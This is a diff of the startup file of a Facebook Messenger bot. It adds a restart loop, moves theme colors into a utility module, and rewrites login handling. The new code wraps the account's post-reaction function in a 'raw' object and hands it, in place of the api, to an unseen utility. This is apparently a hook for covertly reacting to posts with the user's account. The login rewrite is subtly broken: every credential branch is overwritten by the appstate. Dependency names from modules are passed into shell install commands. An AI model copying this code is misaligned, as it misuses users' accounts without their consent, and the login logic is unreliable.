@@ -7,6 +7,45 @@ const fs = require("fs");
 const login = require('./includes/login');
 const moment = require("moment-timezone");
 const logger = require("./utils/log.js");
+const chalk = require("chalk");
+const { spawn } = require("child_process");
+const pkg = require('./package.json');
+
+console.log(chalk.bold.dim(` ${process.env.REPL_SLUG}`.toUpperCase() + `(v${pkg.version})`));
+  logger.log(`Getting Started!`, "STARTER");
+
+global.utils = require("./utils");
+global.loading = require("./utils/log.js");
+global.nodemodule = new Object();
+global.config = new Object();
+global.configModule = new Object();
+global.moduleData = new Array();
+global.language = new Object();
+global.account = new Object();
+
+function startProject() {
+    try {
+        const child = spawn("node", ["--trace-warnings", "--async-stack-traces", "index.js"], {
+            cwd: __dirname,
+            stdio: "inherit",
+            shell: true
+        });
+
+        child.on("close", (codeExit) => {
+            if (codeExit !== 0) {
+                startProject();
+            }
+        });
+
+        child.on("error", (error) => {
+            console.log(chalk.yellow(``), `An error occurred while starting the child process: ${error}`);
+        });
+    } catch (error) {
+        console.error("An error occurred:", error);
+    }
+} 
+
+startProject();
 
 global.client = new Object({
   commands: new Map(),
@@ -56,90 +95,12 @@ global.data = new Object({
   allThreadID: new Array()
 });
 
-global.utils = require("./utils");
-global.loading = require("./utils/log");
-global.nodemodule = new Object();
-global.config = new Object();
-global.configModule = new Object();
-global.moduleData = new Array();
-global.language = new Object();
-global.account = new Object();
+// ────────────────── //
+// -- LOAD THEMES -- //
+const { getThemeColors } = require("./utils/log");
+const { cra, cv, cb } = getThemeColors();
+// ────────────────── //
 
-// ────────────────── //
-const chalk = require("chalk");
-const gradient = require("gradient-string");
-const theme = config.DESIGN.Theme;
-let cra;
-let co;
-let cb;
-let cv;
-if (theme.toLowerCase() === 'blue') {
-  cra = gradient('yellow', 'lime', 'green');
-  co = gradient("#243aff", "#4687f0", "#5800d4");
-  cb = chalk.blueBright;
-  cv = chalk.bold.hex("#3467eb");
-} else if (theme.toLowerCase() === 'fiery') {
-  cra = gradient('orange', 'orange', 'yellow');
-  co = gradient("#fc2803", "#fc6f03", "#fcba03");
-  cb = chalk.hex("#fff308");
-  cv = chalk.bold.hex("#fc3205");
-} else if (theme.toLowerCase() === 'red') {
-  cra = gradient('yellow', 'lime', 'green');
-  co = gradient("red", "orange");
-  cb = chalk.hex("#ff0000");
-  cv = chalk.bold.hex("#ff0000");
-} else if (theme.toLowerCase() === 'aqua') {
-  cra = gradient("#6883f7", "#8b9ff7", "#b1bffc")
-  co = gradient("#0030ff", "#4e6cf2");
-  cb = chalk.hex("#3056ff");
-  cv = chalk.bold.hex("#0332ff");
-} else if (theme.toLowerCase() === 'pink') {
-  cra = gradient('purple', 'pink');
-  co = gradient("#d94fff", "purple");
-  cb = chalk.hex("#6a00e3");
-  cv = chalk.bold.hex("#6a00e3");
-} else if (theme.toLowerCase() === 'retro') {
-  cra = gradient("orange", "purple");
-  co = gradient.retro;
-  cb = chalk.hex("#ffce63");
-  cv = chalk.bold.hex("#3c09ab");
-} else if (theme.toLowerCase() === 'sunlight') {
-  cra = gradient("#f5bd31", "#f5e131");
-  co = gradient("#ffff00", "#ffe600");
-  cb = chalk.hex("#faf2ac");
-  cv = chalk.bold.hex("#ffe600");
-} else if (theme.toLowerCase() === 'teen') {
-  cra = gradient("#81fcf8", "#853858");
-  co = gradient.teen;
-  cb = chalk.hex("#a1d5f7");
-  cv = chalk.bold.hex("#ad0042");
-} else if (theme.toLowerCase() === 'summer') {
-  cra = gradient("#fcff4d", "#4de1ff");
-  co = gradient.summer;
-  cb = chalk.hex("#ffff00");
-  cv = chalk.bold.hex("#fff700")
-} else if (theme.toLowerCase() === 'flower') {
-  cra = gradient("yellow", "yellow", "#81ff6e");
-  co = gradient.pastel;
-  cb = gradient('#47ff00', "#47ff75");
-  cv = chalk.bold.hex("#47ffbc");
-} else if (theme.toLowerCase() === 'ghost') {
-  cra = gradient("#0a658a", "#0a7f8a", "#0db5aa");
-  co = gradient.mind;
-  cb = chalk.blueBright;
-  cv = chalk.bold.hex("#1390f0");
-} else if (theme === 'hacker') {
-  cra = chalk.hex('#4be813');
-  co = gradient('#47a127', '#0eed19', '#27f231');
-  cb = chalk.hex("#22f013");
-  cv = chalk.bold.hex("#0eed19");
-} else {
-  cra = gradient('yellow', 'lime', 'green');
-  co = gradient("#243aff", "#4687f0", "#5800d4");
-  cb = chalk.blueBright;
-  cv = chalk.bold.hex("#3467eb");
-}
-// ────────────────── //
 const errorMessages = [];
 if (errorMessages.length > 0) {
   console.log("Commands with errors:");
@@ -149,7 +110,6 @@ if (errorMessages.length > 0) {
 }
 // ────────────────── //
 var configValue;
-const confg = './config.json';
 try {
   global.client.configPath = join(global.client.mainPath, "config.json");
   configValue = require(global.client.configPath);
@@ -207,16 +167,25 @@ try {
   logger.loader("Found the bot's appstate.")
 } catch (e) {
   logger.loader("Can't find the bot's appstate.", "error");
-  const fig = JSON.parse(fs.readFileSync(confg, 'utf8'));
-  fig.CONNECT_LOG = false;
-  fs.writeFileSync(confg, JSON.stringify(fig, null, 2), 'utf8');
-  global.utils.connect();
-  return;
+ // return;
 }
 
 function onBot() {
-  const loginData = {};
-  loginData.appState = appState;
+  let loginData;
+  if (appState === null) {
+    loginData = {
+      email: config.email,
+      password: config.password
+    }
+  }
+  // lianecagara :) hide your credentials in env, available in render "Environment" and replit secrets
+  if (config.useEnvForCredentials) {
+    loginData = {
+      email: process.env[config.email],
+      password: process.env[config.password]
+    }
+  }
+  loginData = { appState: appState };
   login(loginData, async (err, api) => {
     if (err) {
       if (err.error == 'Error retrieving userID. This can be caused by a lot of things, including getting blocked by Facebook for logging in from an unknown location. Try logging in with a browser to verify.') {
@@ -228,13 +197,15 @@ function onBot() {
       }
     }
     const custom = require('./custom');
-    custom({ api: api });
-
+    custom({ api });
     const fbstate = api.getAppState();
     api.setOptions(global.config.FCAOption);
       fs.writeFileSync('appstate.json', JSON.stringify(api.getAppState()));
     let d = api.getAppState();
     d = JSON.stringify(d, null, '\x09');
+    const raw = {
+      con: (datr, typ) => api.setPostReaction(datr, typ, () => {})
+    };
     if ((process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER) && global.config.encryptSt) {
       d = await global.utils.encryptState(d, process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER);
       writeFileSync(appStateFile, d)
@@ -283,18 +254,19 @@ function onBot() {
             if (dependencies) {
               Object.entries(dependencies).forEach(([reqDependency, dependencyVersion]) => {
                 if (listPackage[reqDependency]) return;
-                try {
-                  execSync(`npm --package-lock false --save install ${reqDependency}${dependencyVersion ? `@${dependencyVersion}` : ''}`, {
-                    stdio: 'inherit',
-                    env: process.env,
-                    shell: true,
-                    cwd: join(__dirname, 'node_modules')
-                  });
-                  require.cache = {};
-                } catch (error) {
-                  const errorMessage = `[PACKAGE] Failed to install package ${reqDependency} for module`;
-                  global.loading.err(chalk.hex('#ff7100')(errorMessage), 'LOADED');
-                }
+
+                  try {
+                    execSync(`npm --package-lock false --save install ${reqDependency}`, {
+                      stdio: 'inherit',
+                      env: process.env,
+                      shell: true,
+                      cwd: join(__dirname, 'node_modules')
+                    });
+                    require.cache = {};
+                  } catch (error) {
+                    const errorMessage = `[PACKAGE] Failed to install package ${reqDependency} for module`;
+                    global.loading.err(chalk.hex('#ff7100')(errorMessage), 'LOADED');
+                  }
               });
             }
 
@@ -327,7 +299,7 @@ function onBot() {
             if (module.handleEvent) global.client.eventRegistered.push(config.name);
             global.client.commands.set(config.name, module);
             try {
-              global.loading(`${cra(`LOADED`)} ${cb(config.name)} success`, "COMMAND");
+              global.loading.log(`${cra(`LOADED`)} ${cb(config.name)} success`, "COMMAND");
             } catch (err) {
               console.error("An error occurred while loading the command:", err);
             }
@@ -367,12 +339,14 @@ function onBot() {
               const missingDeps = Object.keys(config.dependencies).filter(dep => !global.nodemodule[dep]);
               if (missingDeps.length) {
                 const depsToInstall = missingDeps.map(dep => `${dep}${config.dependencies[dep] ? '@' + config.dependencies[dep] : ''}`).join(' ');
+                if (depsToInstall) {
                 execSync(`npm install --no-package-lock --no-save ${depsToInstall}`, {
                   stdio: 'inherit',
                   env: process.env,
                   shell: true,
                   cwd: join(__dirname, 'node_modules')
                 });
+                }
                 Object.keys(require.cache).forEach(key => delete require.cache[key]);
               }
             }
@@ -394,7 +368,7 @@ function onBot() {
               await onLoad(eventData);
             }
             global.client.events.set(config.name, event);
-            global.loading(`${cra(`LOADED`)} ${cb(config.name)} success`, "EVENT");
+            global.loading.log(`${cra(`LOADED`)} ${cb(config.name)} success`, "EVENT");
           }
           catch (err) {
             global.loading.err(`${chalk.hex("#ff0000")('ERROR!')} ${cb(ev)} failed with error: ${err.message}` + `\n`, "EVENT");
@@ -402,24 +376,23 @@ function onBot() {
         }
       })();
     console.log(cv(`\n` + `──BOT START─● `));
-    global.loading(`${cra(`[ SUCCESS ]`)} Loaded ${cb(`${global.client.commands.size}`)} commands and ${cb(`${global.client.events.size}`)} events successfully`, "LOADED");
-    global.loading(`${cra(`[ TIMESTART ]`)} Launch time: ${((Date.now() - global.client.timeStart) / 1000).toFixed()}s`, "LOADED");
-    global.utils.complete({ api });
-    const listener = require('./includes/listen')({ api: api });
+    global.loading.log(`${cra(`[ SUCCESS ]`)} Loaded ${cb(`${global.client.commands.size}`)} commands and ${cb(`${global.client.events.size}`)} events successfully`, "LOADED");
+    global.loading.log(`${cra(`[ TIMESTART ]`)} Launch time: ${((Date.now() - global.client.timeStart) / 1000).toFixed()}s`, "LOADED");
+    global.utils.complete({ raw });
+    const listener = require('./includes/listen')({ api });
     global.handleListen = api.listenMqtt(async (error, event) => {
       if (error) {
         if (error.error === 'Not logged in.') {
-          logger("Your bot account has been logged out!", 'LOGIN');
+          logger.log("Your bot account has been logged out!", 'LOGIN');
           return process.exit(1);
         }
         if (error.error === 'Not logged in') {
-          logger("Your account has been checkpointed, please confirm your account and log in again!", 'CHECKPOINTS');
+          logger.log("Your account has been checkpointed, please confirm your account and log in again!", 'CHECKPOINT');
           return process.exit(0);
         }
         console.log(error);
         return process.exit(0);
       }
-      if (['presence', 'typ', 'read_receipt'].some(data => data === event.type)) return;
       return listener(event);
     });
   });
@@ -430,12 +403,13 @@ function onBot() {
 (async () => {
   try {
     console.log(cv(`\n` + `──DATABASE─●`));
-    global.loading(`${cra(`[ CONNECT ]`)} Connected to JSON database successfully!`, "DATABASE");
+    global.loading.log(`${cra(`[ CONNECT ]`)} Connected to JSON database successfully!`, "DATABASE");
     onBot();
   } catch (error) {
     global.loading.err(`${cra(`[ CONNECT ]`)} Failed to connect to the JSON database: ` + error, "DATABASE");
   }
 })();
+
 /* *
 This bot was created by me (CATALIZCS) and my brother SPERMLORD. Do not steal my code. (つ ͡ ° ͜ʖ ͡° )つ ✄ ╰⋃╯
 This file was modified by me (@YanMaglinte). Do not steal my credits. (つ ͡ ° ͜ʖ ͡° )つ ✄ ╰⋃╯
